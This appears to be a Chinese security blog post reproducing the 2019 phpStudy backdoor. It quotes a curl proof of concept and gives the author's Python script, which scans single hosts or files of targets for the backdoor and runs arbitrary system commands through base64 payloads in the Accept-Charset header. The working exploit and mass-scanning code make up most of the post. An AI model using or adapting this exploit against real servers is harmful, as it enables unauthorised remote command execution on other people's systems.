<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		
		<meta name="author" content="ifish">
		
		<meta name="generator" content="Hugo 0.54.0" />
		<title>phpstudy复现 &middot; if1sh</title>
		<link rel="shortcut icon" href="https://ifishzz.github.io//images/favicon.ico">
		<link rel="stylesheet" href="https://ifishzz.github.io//css/style.css">
		<link rel="stylesheet" href="https://ifishzz.github.io//css/highlight.css">

		
		<link rel="stylesheet" href="https://ifishzz.github.io//css/font-awesome.min.css">
		

		
		<link href="https://ifishzz.github.io/index.xml" rel="alternate" type="application/rss+xml" title="if1sh" />
		

		
	</head>

    <body>
       <nav class="main-nav">
	
	
		<a href='https://ifishzz.github.io/'> <span class="arrow">←</span>Home</a>
	
	<a href='https://ifishzz.github.io//posts'>Archive</a>
	
	<a href='https://ifishzz.github.io//categories'>Cate</a>
	<a href='https://ifishzz.github.io//links'>Link</a>

	<a href='https://ifishzz.github.io//about'>About</a>

	

	
	<a class="cta" href="https://ifishzz.github.io/index.xml">Subscribe</a>
	
</nav>


        <section id="wrapper" class="post">
            <article>
                <header>
                    <h1>
                        phpstudy复现
                    </h1>
                    <h2 class="headline">
                    Sep 30, 2019 00:00
                    · 346 words
                    · 1 minute read
                      <span class="tags">
                      
                      
                          
                              <a href="https://ifishzz.github.io//tags/poc">poc</a>
                          
                      
                      
                      </span>
                    </h2>
                </header>
                
                  
                    <div id="toc">
                      <nav id="TableOfContents">
<ul>
<li><a href="#phpstudy复现">phpstudy复现</a></li>
</ul>
</nav>
                    </div>
                  
                
                <section id="post-body">
                    

<h1 id="phpstudy复现">phpstudy复现</h1>

<p>为什么会复现</p>

<p>明队给我考了一份源码，说是审一审</p>

<p>熟练的打开尘封的win，源码一拖，打开就几个php文件，网站都还没有搭建起来</p>

<p>朋友圈就刷爆了phpstudy后门的消息，我怀疑明队在搞我</p>

<p>在复现的过程中，phpstudy的目录当时是做xss持久化，注册了service worker 谷歌和火狐疯狂弹窗，最后重新安装火狐</p>

<p>别人的poc</p>

<pre><code>curl http://localhost/1.php -H 'Accept-Encoding:gzip,deflate' -H 'Accept-Charset:ZWNobyBgaXBjb25maWdgOw=='
</code></pre>

<p>写了一下poc试试</p>

<pre><code># python test.py 127.0.0.1 手工输入地址检测
# python test.py 1.txt 批量检测txt里面的地址
# python test.py 127.0.0.1 ipconfig

import requests
import sys
import base64


def check_phpinfo(url):
    print(url)
    payload = base64.b64encode(&quot;echo phpinfo();&quot;.encode('utf-8'))
    headers = {
        &quot;accept-charset&quot;: f&quot;{str(payload, 'utf-8')}&quot;,
        &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;,
    }
    try:
        r = requests.get(url, headers=headers)
        if r.status_code == 200 and &quot;phpinfo&quot; in r.text:
            print(f&quot;BackDoor:Server= {r.headers.get('Server')}&quot;)
        else:
            print(&quot;No BackDoor Exit!&quot;)
    except:
        print('bug')

def batch(txt):
    with open(f'{txt}', 'r', encoding='utf-8') as f:
        for u in f:
            if 'http' not in u and 'https' not in u:
                u = 'http://' + u
            u=u.replace('\n',' ')
            check_phpinfo(u)

def execute(url, cmd):
    payload = base64.b64encode(f&quot;system('{cmd}');&quot;.encode('utf-8'))
    headers = {
        &quot;accept-charset&quot;: f&quot;{str(payload, 'utf-8')}&quot;,
        &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;,
    }
    r1 = requests.get(url, headers=headers)
    print(r1.text)





if __name__ == '__main__':
    input = sys.argv[:]
    url = input[1]
    if 'http' not in url and 'https' not in url:
        url = 'http://' + url

    if len(input)==2 and 'txt' in input[1]:
        txt=input[1]
        batch(txt)
    else:
        check_phpinfo(url)

    if len(input)&gt;2:
        cmd=input[2:]
        cmd=' '.join(cmd)
        execute(url,cmd)

</code></pre>

                </section>
            </article>

            
                

            

            

            

            <footer id="footer">
    
    
    <p class="small">
        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/ifishzz">ifish</a>
    </p>
</footer>

        </section>

        <script src="https://ifishzz.github.io//js/jquery-3.3.1.min.js"></script>
<script src="https://ifishzz.github.io//js/main.js"></script>
<script src="https://ifishzz.github.io//js/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>




  




    </body>
</html>
